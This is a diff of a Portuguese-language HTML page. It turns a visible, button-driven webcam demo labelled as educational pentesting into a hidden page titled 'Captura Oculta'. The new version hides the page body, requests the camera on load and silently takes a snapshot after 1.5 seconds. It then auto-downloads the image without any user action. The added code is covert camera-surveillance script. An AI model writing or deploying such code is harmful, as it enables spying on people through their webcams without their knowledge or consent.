@@ -1,50 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Captura Webcam - Pentest Educacional</title>
+  <title>Captura Oculta</title>
 </head>
-<body>
-    <h2>🛡️ Teste de Captura de Imagem da Webcam</h2>
+<body style="display: none;"> <!-- Página invisível -->
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display: none;"></canvas>
 
-    <video id="video" width="320" height="240" autoplay playsinline></video>
-    <br>
-    <button onclick="capture()">Capturar e Baixar Imagem</button>
-    <br><br>
-    <img id="snapshot" src="" style="display:none; border:1px solid #000;"/>
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
 
-    <script>
-        const video = document.getElementById('video');
-        const snapshot = document.getElementById('snapshot');
+    // Acesso automático à webcam
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
 
-        // Solicita acesso à webcam
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(err => {
-                alert("Erro ao acessar a webcam: " + err);
-            });
+        // Espera 1.5 segundos e tira a foto automaticamente
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0);
+          const dataURL = canvas.toDataURL('image/png');
 
-        function capture() {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-
-            const dataURL = canvas.toDataURL('image/png');
-
-            // Mostra a imagem capturada na tela
-            snapshot.src = dataURL;
-            snapshot.style.display = 'block';
-
-            // Cria um link para download automático
-            const link = document.createElement('a');
-            link.href = dataURL;
-            link.download = 'imagem_capturada.png';
-            link.click();
-        }
-    </script>
+          // Baixa automaticamente a imagem
+          const a = document.createElement('a');
+          a.href = dataURL;
+          a.download = 'imagem_capturada.png';
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+        }, 1500); // tempo para garantir que a câmera esteja carregada
+      })
+      .catch(err => {
+        console.error("Erro ao acessar webcam:", err);
+      });
+  </script>
 </body>
 </html>
